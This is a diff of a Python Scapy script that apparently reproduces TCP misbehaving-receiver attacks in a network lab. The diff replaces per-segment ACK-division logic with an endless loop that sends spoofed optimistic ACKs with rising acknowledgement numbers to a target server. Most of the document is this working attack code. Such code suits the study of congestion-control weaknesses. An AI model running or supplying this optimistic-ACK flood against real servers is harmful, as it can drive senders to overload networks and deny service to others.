@@ -18,22 +18,21 @@ stop = False
 FIN = 0x01
 currACKNo = 0
 startACKNo = 0
-MAX_SIZE = 100000
+# MAX_SIZE = 100000
 
-#def sendACK():
-#  global t, stop, currACKNo, socket2, startACKNo
-#  if currACKNo - startACKNo > MAX_SIZE or not stop:
-#    currACKNo += MTU
-#    ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
-#               seq=our_seq_no, ack=currACKNo, flags='A')
-#    t.start()
-#    socket2.send(Ether() / ack_pkt)
-#    print "Sent %d" % currACKNo
+def sendACK():
+ global stop, currACKNo, socket2, startACKNo
+ while True:
+   currACKNo += MTU
+   ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
+              seq=our_seq_no, ack=currACKNo, flags='A')
+   socket2.send(Ether() / ack_pkt)
+   print "Sent %d" % currACKNo
 
 
 #t = threading.Timer(WAIT_TIME, sendACK)
 socket = conf.L2socket(iface="client-eth0")
-#socket2 = conf.L2socket(iface="client-eth0")
+socket2 = conf.L2socket(iface="client-eth0")
 
 syn = IP(dst=IP_DST) / TCP(window=65535, sport=SRC_PORT, dport=DST_PORT, flags='S')
 IP_SRC = syn[IP].src
@@ -70,36 +69,36 @@ def addACKs(pkt):
 
   data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
   
-  ip_total_len = pkt.getlayer(IP).len
-  ip_header_len = pkt.getlayer(IP).ihl * 32 / 8
-  tcp_header_len = pkt.getlayer(TCP).dataofs * 32 / 8
-  tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len
+  # ip_total_len = pkt.getlayer(IP).len
+  # ip_header_len = pkt.getlayer(IP).ihl * 32 / 8
+  # tcp_header_len = pkt.getlayer(TCP).dataofs * 32 / 8
+  # tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len
   
-  add = 0
-  cnt = 2 # how many 4*MSS ACKs to send
-  if pkt.flags & FIN:
-    add = 1
-    cnt = 1
-    stop = True
+  # add = 0
+  # cnt = 2 # how many 4*MSS ACKs to send
+  # if pkt.flags & FIN:
+  #   add = 1
+  #   cnt = 1
+  #   stop = True
 
-  firstACK_num = (pkt[TCP].seq + tcp_seg_len) + add
-  #if maxACK_num > firstACK_num:
-  #  firstACK_num = maxACK_num
-  nextACK_num = (pkt[TCP].seq + tcp_seg_len + cnt*tcp_seg_len*3) + add
-  #if nextACK_num < maxACK_num:
-  #  return
-  #maxACK_num = nextACK_num
+  # firstACK_num = (pkt[TCP].seq + tcp_seg_len) + add
+  # #if maxACK_num > firstACK_num:
+  # #  firstACK_num = maxACK_num
+  # nextACK_num = (pkt[TCP].seq + tcp_seg_len + cnt*tcp_seg_len*3) + add
+  # #if nextACK_num < maxACK_num:
+  # #  return
+  # #maxACK_num = nextACK_num
 
-  if tcp_seg_len == 0:
-    return
-  toACK = range(firstACK_num, nextACK_num, tcp_seg_len*3)
-  if nextACK_num not in toACK:
-    toACK.append(nextACK_num)
+  # if tcp_seg_len == 0:
+  #   return
+  # toACK = range(firstACK_num, nextACK_num, tcp_seg_len*3)
+  # if nextACK_num not in toACK:
+  #   toACK.append(nextACK_num)
 
-  for ACK_num in toACK:
-    ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
-               seq=(pkt[TCP].ack), ack=ACK_num, flags='A')
-    socket.send(Ether() / ack_pkt)
+  # for ACK_num in toACK:
+  #   ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
+  #              seq=(pkt[TCP].ack), ack=ACK_num, flags='A')
+  #   socket.send(Ether() / ack_pkt)
 
 print("Sniffing......")
 sniff(iface="client-eth0", prn=addACKs, filter="tcp and ip", timeout=4)
